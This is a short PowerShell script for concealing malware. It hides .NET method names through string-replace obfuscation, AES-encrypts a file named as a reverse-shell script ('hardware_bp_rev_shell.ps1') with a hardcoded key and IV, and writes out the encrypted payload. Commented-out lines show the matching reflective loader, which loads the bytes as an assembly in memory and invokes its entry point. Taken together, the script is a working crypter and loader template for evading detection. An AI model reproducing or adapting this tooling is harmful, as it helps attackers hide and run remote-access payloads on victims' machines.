$fElA='CreqIbHaqIbHtqIbHeqIbHDqIbHecrqIbHyptqIbHorqIbH'.Replace('qIbH', ''),'Loryaoaryaodryao'.Replace('ryao', ''),'EnxJSYtxJSYrxJSYyPxJSYoxJSYintxJSY'.Replace('xJSY', ''),'RCglSeadCglSLCglSinCglSesCglS'.Replace('CglS', ''),'ElkpuDekpuDmekpuDnkpuDtkpuDAtkpuD'.Replace('kpuD', ''),'MaitKRenMotKRedultKReetKRe'.Replace('tKRe', ''),'FrEHVHoEHVHmBaEHVHseEHVH6EHVH4SEHVHtriEHVHngEHVH'.Replace('EHVH', ''),'ChaNRYJnNRYJgeNRYJExtNRYJenNRYJsioNRYJnNRYJ'.Replace('NRYJ', ''),'CopLofSyTLofSoLofS'.Replace('LofS', ''),'InvLlecoLleckeLlec'.Replace('Llec', ''),'SpNSkZlitNSkZ'.Replace('NSkZ', ''),'DexTMTcomxTMTprxTMTexTMTsxTMTsxTMT'.Replace('xTMT', ''),'TraXCkmnsXCkmfXCkmoXCkmrmXCkmFXCkminaXCkmlBlXCkmoXCkmckXCkm'.Replace('XCkm', ''),'GetrUltCurUltrrrUltenrUlttrUltPrUltrrUltocrUltesrUltsrUlt'.Replace('rUlt', '');

#$KcXpf = [System.Convert]::($fElA[6])("eh6cMkJ2HBbouvVlbHjdyw==")
#read file
$KcXpf = [System.IO.File]::ReadAllBytes('C:\Users\KuznetsovAntA\Desktop\hardware_bp_rev_shell.ps1')

$yTtPD=[System.Security.Cryptography.Aes]::Create();
$yTtPD.Mode=[System.Security.Cryptography.CipherMode]::CBC;
$yTtPD.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7;
$yTtPD.Key=[System.Convert]::($fElA[6])('rRWyCyQLtuqH/zi2mhFDObO+dhUUkEuGFZ7FgqLLt14=');
$yTtPD.IV=[System.Convert]::($fElA[6])('dn2lq2CDURZOe442/46czQ==');
$lVePM=$yTtPD.CreateEncryptor();

$JjJvL=$lVePM.($fElA[12])($KcXpf,0,$KcXpf.Length);
$lVePM.Dispose();
$yTtPD.Dispose();

#[System.Text.Encoding]::UTF8.GetString($JjJvL);
#write to file
[System.IO.File]::WriteAllBytes('C:\Users\KuznetsovAntA\Desktop\hardware_bp_rev_shell.txt.bin', $JjJvL)
#[System.Reflection.Assembly]::($fElA[1])([byte[]]$JjJvL).($fElA[2]).($fElA[9])($null,$null);
#[System.Reflection.Assembly]::Load([byte[]]$Var).EntryPoint.Invoke($null,$null); 
